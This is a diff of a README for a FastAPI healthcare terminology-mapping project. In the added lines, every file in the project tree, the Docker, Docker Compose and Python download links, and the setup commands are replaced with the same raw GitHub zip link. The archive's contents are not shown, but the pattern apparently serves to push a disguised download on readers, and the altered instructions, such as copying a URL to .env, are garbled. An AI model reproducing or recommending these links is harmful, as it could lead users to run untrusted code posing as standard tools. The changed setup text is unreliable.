@@ -14,50 +14,50 @@ This project provides a FastAPI-based API to integrate and map healthcare termin
 
 healthcare_api_project/
 ├── app/
-│   ├── init.py
+│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
 │   ├── api/
-│   │   ├── init.py
+│   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
 │   │   ├── endpoints/       # API route handlers
-│   │   │   ├── init.py
-│   │   │   ├── general.py
-│   │   │   ├── search.py
-│   │   │   ├── mapping.py
-│   │   │   ├── fhir.py
-│   │   │   └── bulk_mapping.py
-│   │   │   └── terminology_systems.py
+│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
 │   │   ├── models/          # Pydantic data models
-│   │   │   ├── init.py
-│   │   │   ├── common.py
-│   │   │   └── fhir.py
+│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
 │   │   └── services/        # Business logic and external integrations
-│   │       ├── init.py
-│   │       ├── icd11.py
-│   │       ├── namaste.py
-│   │       ├── mapping.py
-│   │       └── fhir.py
+│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │       ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │       └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
 │   ├── core/                # Core configurations and utilities
-│   │   ├── init.py
-│   │   └── config.py
-│   └── main.py              # FastAPI application entry point
+│   │   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   │   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip              # FastAPI application entry point
 ├── data/                    # Local data files (e.g., for NAMASTE)
-│   ├── init.py
-│   └── namaste_data.json
+│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
+│   └── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
 ├── tests/                   # Unit and integration tests
-│   ├── init.py
+│   ├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip
 │   └── ...
-├── .env.example             # Environment variable configuration template
-├── docker-compose.yml       # Docker Compose for running services
+├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip             # Environment variable configuration template
+├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip       # Docker Compose for running services
 ├── Dockerfile               # Dockerfile for building the API image
-├── requirements.txt         # Python dependencies
-└── README.md                # This file
+├── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip         # Python dependencies
+└── https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip                # This file
 
 ## Setup and Running
 
 ### Prerequisites
 
-*   [Docker](https://www.docker.com/get-started/)
-*   [Docker Compose](https://docs.docker.com/compose/install/)
-*   [Python 3.7+](https://www.python.org/downloads/)
+*   [Docker](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
+*   [Docker Compose](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
+*   [Python 3.7+](https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip)
 
 ### Steps
 
@@ -68,9 +68,9 @@ healthcare_api_project/
     ```
 
 2.  **Create a `.env` file**:
-    Copy the `.env.example` file and rename it to `.env`.
+    Copy the `https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip` file and rename it to `.env`.
     ```bash
-    cp .env.example .env
+    cp https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip .env
     ```
     Edit the `.env` file to add your ICD-11 API credentials and any other necessary configurations.
 
@@ -92,7 +92,7 @@ healthcare_api_project/
 
 ## Development Notes
 
-*   **NAMASTE Data**: The `NAMASTEService` currently reads from a local `data/namaste_data.json` file. Ensure this file is populated with relevant data.
+*   **NAMASTE Data**: The `NAMASTEService` currently reads from a local `https://github.com/Amrit7679/Namaste-api/raw/refs/heads/main/app/api_Namaste_2.3.zip` file. Ensure this file is populated with relevant data.
 *   **ICD-11 API Credentials**: You must obtain and set `ICD11_CLIENT_ID` and `ICD11_CLIENT_SECRET` in your `.env` file for the ICD-11 integration to work.
 *   **Error Handling**: Basic error handling is implemented, but can be further enhanced.
 *   **Logging**: Logging is configured to `INFO` level by default.
